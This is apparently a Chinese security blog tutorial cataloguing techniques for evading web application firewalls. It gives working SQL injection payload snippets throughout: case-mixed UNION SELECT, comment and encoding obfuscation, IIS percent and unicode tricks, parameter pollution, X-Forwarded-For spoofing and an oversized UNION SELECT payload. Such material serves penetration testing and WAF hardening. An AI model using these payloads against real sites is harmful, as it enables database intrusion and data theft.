# 0x00 简介

WAF的绕过我们无非就是利用WEB程序缺陷，容器特性,网络协议，数据库特性来组合利用绕过，从用户发出请求到数据库的每一点，寻找突破口。


# 0x01 常见的手段

1. HTTP协议

2. 大小混写

3. 替换

4. 使用特殊字符

5. 使用编码

6. 等价替换

7. 容器特性

8. 白名单

9. 缓冲溢出

等等



### HTTP协议

HTTP协议中有很多功能，一般来说我们可以用到的就是编码功能，后来有大佬发现了分块传入来绕过WAF，具体大家可以百度看看，大概http协议我们可以总结如下。

1. 构造畸形数据包 

2. 编码

3. 分块

4. 数据包溢出

可能有些表述有误，但是大概意思如此，构造畸形数据包的原理是http协议是有一定的容错性的，我们也常用这个容错性去绕过上传。编码绕过的原理也是利用程序解密，而waf识别不了，数据包溢出则是数据包过大waf自动丢弃不识别



### 大小混写

大小混写一般是绕过一些简单的正则 ，对大小写敏感的。

```
UnIon SlEct 

```


### 替换

这种一般是因为正则吧我们的关键词给替换删除了，但是没有进行多次匹配导致绕过

```
ununionion seselectlect

un/**/ion se/**/lect

```


### 特殊字符

特殊符号也多是数据库的特性，利用数据库可以使用多种符号来绕过，多种的运算符

```
`updatexml`

and!!!1=1

/**/

/*!50000*/

```


### 使用编码

这里和http协议差不多，多重编码等等，url编码会自己解码一次，但是有的程序他可以自己多次解密,那么我们就可以拿来利用
还有的程序参数他是支持base64的 那么我们的payload就可以编码绕过了

```
= -> %3D ->%25%33%44

and 1=1 -> YW5kIDE9MQ==

```


### 等价替换

mysql众多的函数也我们的bypass带来了很对便利，比如一个分割字符串的函数都是几个，倘若被过滤一个可以换成其他的

```
substr(version(),1,1)
Substring(version(),1,1)
Left(version(),1)

```


### 容器特性

1. iis

容器的特性给我们绕过非常的有帮助，感谢那些善于发现的师傅们。

```
iis+asp 的%特性：当传入的 s%e%l%e%c%t 函数被%分割时，解析出来还是select
iis+asp 的unicode特性 ： iis支持Unicode的解析 我们传入s%u0065lect解析为select

    +--------------------------------------------------------------------+
    |   Keywords     |        WAF             |  ASP/ASP.NET             |
    +--------------------------------------------------------------------+
    | sele%ct * fr%om..  | sele%ct * fr%om..      | select * from..      |
    | ;dr%op ta%ble xxx  | ;dr%op ta%ble xxx      | ;drop table xxx      |
    | <scr%ipt>      | <scr%ipt>                  | <script>             |
    | <if%rame>      | <if%rame>                  | <iframe>             |
    +--------------------------------------------------------------------+

```

2. hpp

hpp参数污染，前面我们绕过安全狗用到过，不同容器对我们传入的值解析顺序不同，这也是我们可以利用的

```
    php+apache    &id=1&id=2     他只解析最后一个


    +------------------------------------------------------------------+
    | Web Server      | Parameter Interpretation         | Example     |
    +------------------------------------------------------------------+
    | ASP.NET/IIS     | Concatenation by comma       | par1=val1,val2  |
    | ASP/IIS         | Concatenation by comma       | par1=val1,val2  |
    | PHP/Apache      | The last param is resulting  | par1=val2       |
    | JSP/Tomcat      | The first param is resulting | par1=val1       |
    | Perl/Apache     | The first param is resulting | par1=val1       |
    | DBMan           | Concatenation by two tildes  | par1=val1~~val2 |
    +------------------------------------------------------------------+

```

3. HTTP Parameter Contamination

不同的容器他会对我们的参数带入的一些特殊字符解析成不同的东西，比如

```
    +-----------------------------------------------------------+
    | Query String    |    Web Servers response / GET values    |
    +-----------------------------------------------------------+
    |         | Apache/2.2.16, PHP/5.3.3 | IIS6/ASP             |
    +-----------------------------------------------------------+
    | ?test[1=2       | test_1=2             | test[1=2         |
    | ?test=%         | test=%               | test=            |
    | ?test%00=1      | test=1               | test=1           |
    | ?test=1%001     | NULL                 | test=1           |
    | ?test+d=1+2     | test_d=1 2           | test d=1 2       |
    +-----------------------------------------------------------+

```


### 白名单

有的程序他会对本地ip不拦截，同时他的host使用`X-Forwarded-For` 等来获取

```
X-Forwarded-For:127.0.0.1

```


### 缓冲溢出

waf他处理数据包的大小有限，早期安全狗你提交过长url会直接奔溃

```
?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26

```




### 参考文章

1. Obfuscate and Bypass ： https://www.exploit-db.com/papers/17934

2. 9 ways to bypass Web Application Firewall：https://www.digitalmunition.me/2018/02/sql-injection-9-ways-bypass-web-application-firewall/




# 0x02 文末

bypass不要局限与一种，多种组合才能最大利用，你需要了解mysql的语法，特殊的符号，特殊的写法，FUZZ他可以容错的地方


#### 本文如有错误，请及时提醒，避免误导他人

* author：404